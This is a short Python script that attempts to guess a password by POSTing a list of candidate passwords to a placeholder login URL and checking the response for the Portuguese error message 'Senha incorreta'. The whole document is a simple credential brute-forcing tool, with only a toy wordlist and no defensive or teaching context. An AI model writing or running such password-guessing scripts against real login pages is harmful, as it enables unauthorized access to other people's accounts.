import requests

url = 'http://example.com/login'

passwords = ['password1', 'password2', 'password3', 'password4']

for password in passwords:
    response = requests.post(url, data={'password': password})
    
    if 'Senha incorreta' not in response.text:
        print('Senha encontrada:', password)
        break
